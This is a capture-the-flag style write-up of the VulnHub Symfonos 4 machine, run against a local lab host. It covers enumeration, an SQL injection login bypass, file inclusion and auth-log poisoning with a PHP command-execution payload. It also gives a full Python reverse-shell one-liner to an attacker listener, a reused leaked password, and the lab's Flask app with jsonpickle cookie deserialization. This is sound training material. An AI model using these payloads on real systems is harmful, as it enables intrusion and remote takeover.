first we start enuemration with nmap 

`nmap -sC -sV -T4 -oN normal.tcp -p 80,22 -Pn <IP>`

```
# Nmap 7.93 scan initiated Sun Feb 19 21:45:55 2023 as: nmap -sC -sV -T4 -oN normal.tcp -p 80,22 -Pn 192.168.0.100
Nmap scan report for 192.168.0.100
Host is up (0.00086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 f9c17395a417dff6ed5c8e8ac805f98f (RSA)
|   256 bec1fdf13364399a683564f9bd27ec01 (ECDSA)
|_  256 66f76ae8edd51d2d36326439384f9c8a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 19 21:46:03 2023 -- 1 IP address (1 host up) scanned in 8.58 seconds
```

![image](https://user-images.githubusercontent.com/87468669/219974389-487cbb7b-b8bc-4b47-ba82-2160f7066e7c.png)

notice a web server running on port 80, opening it on a browser, we can see a pic with a god pic as the background. checking page source, got nothing so  let's burst hidden dir 

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Vulnhub/symfonos1]
└─$ ffuf -u "http://192.168.0.100/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 403 -fs 0 -ic  -e .txt,.php,.bak,.sql,.zip

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.100/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .txt .php .bak .sql .zip 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
 :: Filter           : Response size: 0
________________________________________________

                        [Status: 200, Size: 201, Words: 18, Lines: 20, Duration: 1522ms]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 23ms]
manual                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 52ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 23ms]
javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 4ms]
atlantis.php            [Status: 200, Size: 1718, Words: 765, Lines: 44, Duration: 220ms]
gods                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 17ms]
:: Progress: [1323282/1323282] :: Job [1/1] :: 4022 req/sec :: Duration: [0:07:01] :: Errors: 0 ::
```

cool we got some hidden dirs, let's check out the `atlantis.php` dir first.

![image](https://user-images.githubusercontent.com/87468669/219975037-57294324-f637-41e7-98e3-ac6f4ab8021b.png)

we got a login page, let's try out sqli auth bypass. `admin or 1=1-- `& password `passwd`.

![image](https://user-images.githubusercontent.com/87468669/219975244-5cad795a-d1f3-425f-8966-001ba31948b3.png)

cool we bypassed auth and got redirected to a `sea.php` dir and we can see the url parameter which looks like a potential lfi. let's check the `god` dir.

![image](https://user-images.githubusercontent.com/87468669/219975341-d9d5367b-fe89-4104-977e-bc60ec578fc4.png)

we can see some `.log` files, let's download this files and check their content.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Vulnhub/symfonos1]
└─$ wget http://192.168.0.100/gods/hades.log       
--2023-02-19 22:11:19--  http://192.168.0.100/gods/hades.log
Connecting to 192.168.0.100:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 295
Saving to: ‘hades.log’

hades.log                                 100%[===================================================================================>]     295  --.-KB/s    in 0s      

2023-02-19 22:11:19 (12.1 MB/s) - ‘hades.log’ saved [295/295]

                                                                                                                                                                      
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Vulnhub/symfonos1]
└─$ cat hades.log        
Hades was the god of the underworld and the name eventually came to also describe the home of the dead as well. He was the oldest male child of Cronus and Rhea. Hades and his brothers Zeus and Poseidon defeated their father and the Titans to end their reign, claiming rulership over the cosmos.
                                                                                                                                                                      
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Vulnhub/symfonos1]
└─$ 
```

it is the same content we got from the sea.php dir, let's test for lfi.

![image](https://user-images.githubusercontent.com/87468669/219976602-a31c4a8a-5890-412f-a489-6a99f20c28cc.png)

cool we got the `auth` log file, this is because if we could remember there was a `.log` extension appended to the all the files in the `/god` dir. Now let's do log poisonning

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Vulnhub/symfonos1]
└─$ ssh '<?php system($_GET['cmd']); ?>'@192.168.0.100
The authenticity of host '192.168.0.100 (192.168.0.100)' can't be established.
ED25519 key fingerprint is SHA256:ntMXt1jIeiDKNEuRMRXU6uCVo/fmwaEqmxDA5r4nwds.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.100' (ED25519) to the list of known hosts.
<?php system($_GET[cmd]); ?>@192.168.0.100's password: 
Permission denied, please try again.
<?php system($_GET[cmd]); ?>@192.168.0.100's password: 
Permission denied, please try again.
<?php system($_GET[cmd]); ?>@192.168.0.100's password: 
<?php system($_GET[cmd]); ?>@192.168.0.100: Permission denied (publickey,password).
```
poison the auth log file through ssh. now we poisoned the log, let's check it on the web page 

![image](https://user-images.githubusercontent.com/87468669/219976923-0405d929-f638-4dd1-860e-13636e2b69c5.png)

cool we got RCE. now let's get a reverse shell.

![image](https://user-images.githubusercontent.com/87468669/219977259-a8a85d27-87a4-4559-a4cc-8cc9e05fc155.png)

fireup ncat listener

reverse shell payload:
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Vulnhub/symfonos1]
└─$ nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 192.168.0.100.
Ncat: Connection from 192.168.0.100:60000.
www-data@symfonos4:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@symfonos4:/var/www/html$
```
boom we got a reverse shell


## Privilege Escalation

![image](https://user-images.githubusercontent.com/87468669/219977645-665baf93-6e36-4a0a-92c1-e3e56abb9db6.png)

checking the process running as root, we can see a local server running on port 8080

![image](https://user-images.githubusercontent.com/87468669/219980284-2a12644f-013a-4928-80c8-b78a299d18cc.png)

checking the `/var/www/html/atlantis.php` file, we can see a cred for mysql, `root:yVzyRGw3cG2Uyt2r`. let's try su as user `poseidon` using that password 

```
www-data@symfonos4:/tmp$ su poseidon
Password: 
poseidon@symfonos4:/tmp$ id
uid=1000(poseidon) gid=1000(poseidon) groups=1000(poseidon),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
poseidon@symfonos4:/tmp$ sudo -l
bash: sudo: command not found
poseidon@symfonos4:/tmp$ 
```
boom it worked, let's escalate privs further. now we have password for user `poseidon`, let's port forward `127.0.0.1:8080` to our attacker machine, remember we got the port through the process.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Vulnhub/symfonos1]
└─$ ssh -L 8080:127.0.0.1:8080 poseidon@192.168.0.100
poseidon@192.168.0.100's password: 
Linux symfonos4 4.19.0-5-686 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 18 02:50:19 2019 from 192.168.1.147
poseidon@symfonos4:~$ 
```

![image](https://user-images.githubusercontent.com/87468669/219981459-bc272465-be60-4459-abf9-4cf194ef077e.png)

opening the forwarded port on a broswer, we got a webpage.

```
poseidon@symfonos4:/opt/code$ cat app.py
from flask import Flask, request, render_template, current_app, redirect

import jsonpickle
import base64

app = Flask(__name__)

class User(object):

    def __init__(self, username):
        self.username = username


@app.route('/')
def index():
    if request.cookies.get("username"):
        u = jsonpickle.decode(base64.b64decode(request.cookies.get("username")))
        return render_template("index.html", username=u.username)
    else:
        w = redirect("/whoami")
        response = current_app.make_response(w)
        u = User("Poseidon")
        encoded = base64.b64encode(jsonpickle.encode(u))
        response.set_cookie("username", value=encoded)
        return response


@app.route('/whoami')
def whoami():
    user = jsonpickle.decode(base64.b64decode(request.cookies.get("username")))
    username = user.username
    return render_template("whoami.html", username=username)


if __name__ == '__main__':
    app.run()
```





